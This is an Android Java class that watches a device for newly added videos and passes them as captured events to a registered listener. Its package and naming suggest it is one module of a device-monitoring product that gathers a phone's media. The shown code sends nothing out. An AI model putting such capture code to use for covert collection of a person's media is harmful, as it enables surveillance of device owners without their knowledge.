package com.vvt.capture.video;

import java.util.ArrayList;

import android.content.Context;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;


/**
 * @author Aruna
 * @version 1.0
 * @created 22-Jul-2011 11:48:41
 */

/**
 * Used to capture newly added Videos in the device.  
 */
public class FxVideoCapture implements FxVideoCaptureObserver.OnCaptureListener {
	
	private static final String TAG = "FxVideoCapture";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	private FxVideoCaptureObserver mFxVideoCaptureObserver;
	private Context mContext;
	private String mWritablepath;
	private FxEventListener mFxEventListner;
	private boolean mIsWorking;
	
	public FxVideoCapture(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException("Capturing is working, please call stopCapture before unregister.");
		}
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "startObserver # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if(mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if (!mIsWorking) {
			mIsWorking = true;
			
			mFxVideoCaptureObserver = FxVideoCaptureObserver.getInstance(mContext);
			mFxVideoCaptureObserver.setLoggablePath(mWritablepath);
			mFxVideoCaptureObserver.setDateFormat(DATE_FORMAT);
			mFxVideoCaptureObserver.registerObserver(this);
		}
		if(LOGV) FxLog.v(TAG, "startObserver # EXIT ...");
	}
	
	public void stopCapture() {
		if(mFxVideoCaptureObserver != null) {
			mFxVideoCaptureObserver.unregisterObserver(this);
			mIsWorking = false;
		}
	}

	@Override
	public void onCapture(ArrayList<FxEvent> Videos) {
		if(LOGV) FxLog.v(TAG, "onCapture # ENTER ...");
		
		if(this.mFxEventListner != null)
			this.mFxEventListner.onEventCaptured(Videos);
		else 
			if(LOGE) FxLog.e(TAG, "mFxEventListner is null");
		
		if(LOGV) FxLog.v(TAG, "onCapture # EXIT ...");
	}
}

